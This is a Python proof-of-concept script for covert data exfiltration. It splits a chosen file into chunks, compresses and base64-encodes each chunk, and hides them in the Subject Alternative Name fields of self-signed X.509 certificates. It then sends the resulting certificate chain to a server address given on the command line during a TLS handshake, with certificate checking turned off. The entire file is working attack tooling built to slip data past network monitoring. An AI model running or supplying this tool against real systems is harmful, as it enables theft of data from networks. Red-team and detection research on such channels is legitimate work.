import argparse
import base64
import cryptography.hazmat
import cryptography.x509
import datetime
import lzma
import os
import random
import socket
import ssl


def parse_args():
	p = argparse.ArgumentParser()

	required = p.add_argument_group("required arguments")

	required.add_argument(
		"-f",
		"--file",
		type=argparse.FileType('rb'),
		help="file to send",
		required=True
	)

	required.add_argument(
		"-i",
		"--ip",
		type=str,
		help="server address",
		required=True
	)

	required.add_argument(
		"-p",
		"--port",
		type=int,
		help="server port",
		required=True
	)

	return p.parse_args()


def generate_cert(key, b, file_ext=None):
	builder = cryptography.x509.CertificateBuilder()

	# Set the certificate's subject (and issuer since it's self-signed)
	subject = cryptography.x509.Name([
		cryptography.x509.NameAttribute(cryptography.x509.NameOID.COUNTRY_NAME, u"US")
	])
	builder = builder.subject_name(subject)
	builder = builder.issuer_name(subject)

	# Set random serial number and validity period of 1 year
	builder = builder.serial_number(cryptography.x509.random_serial_number())
	builder = builder.not_valid_before(datetime.datetime.utcnow())
	builder = builder.not_valid_after(datetime.datetime.utcnow() + datetime.timedelta(days=365))

	# Store the file extension and/or bytes in the subject alternative name extension
	# extension = (b"DNS:" + b) if not file_ext else (b"DNS:" + ) + (b"DNS:" + b)

	names = [cryptography.x509.DNSName(b)]
	if file_ext:
		names.insert(0, cryptography.x509.DNSName(file_ext))

	builder = builder.add_extension(cryptography.x509.SubjectAlternativeName(names), critical=False)

	# Set the public key and self-sign the cert
	builder = builder.public_key(key.public_key())
	cert = builder.sign(key, cryptography.hazmat.primitives.hashes.SHA512(), cryptography.hazmat.backends.default_backend())

	# Return the PEM formatting for appending to our certificate chain
	return cert.public_bytes(cryptography.hazmat.primitives.serialization.Encoding.PEM)


if __name__ == "__main__":
	args = parse_args()

	# Generate a 4096 bit RSA key pair
	key = cryptography.hazmat.primitives.asymmetric.rsa.generate_private_key(public_exponent=65537, key_size=4096, backend=cryptography.hazmat.backends.default_backend())

	# Output for the generated certificate chain
	output = os.path.join(os.getcwd(), "chain.pem")

	# Chunk up large files and split them into multiple certificates
	with open(output, "wb") as o:
		chunk_size = random.randint(1980, 2020)

		# Encode the first certificate in the chain with the file's extension
		first_chunk = args.file.read(2000)
		file_ext = os.path.splitext(args.file.name)[1]
		o.write(generate_cert(key, base64.b64encode(lzma.compress(first_chunk)).decode("utf-8"), file_ext))

		# Compress and encode each remaining chunk in the file
		for chunk in iter(lambda: args.file.read(chunk_size), b""):
			compressed = lzma.compress(chunk)
			encoded = base64.b64encode(compressed).decode("utf-8")
			cert_out = generate_cert(key, encoded)
			o.write(cert_out)

			# Change size of the next cert
			chunk_size = random.randint(1980, 2020)

		# Export private key
		priv_key = key.private_bytes(cryptography.hazmat.primitives.serialization.Encoding.PEM, cryptography.hazmat.primitives.serialization.PrivateFormat.TraditionalOpenSSL, cryptography.hazmat.primitives.serialization.NoEncryption())
		o.write(priv_key)

	# Just for this PoC, ignore the server's certificate and don't validate it
	client_context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
	client_context.check_hostname = False
	client_context.verify_mode = ssl.CERT_NONE

	# Send our generated certificate chain during the handshake
	client_context.load_cert_chain(output)

	# Connect to the server
	try:
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		conn = client_context.wrap_socket(sock, server_side=False)
		conn.connect((args.ip, args.port))
		print("[*] File sent")

	# Handle any possible exceptions
	except Exception as e:
		print("[!] {}".format(e))

	# Remove the created certificate chain
	finally:
		os.remove(output)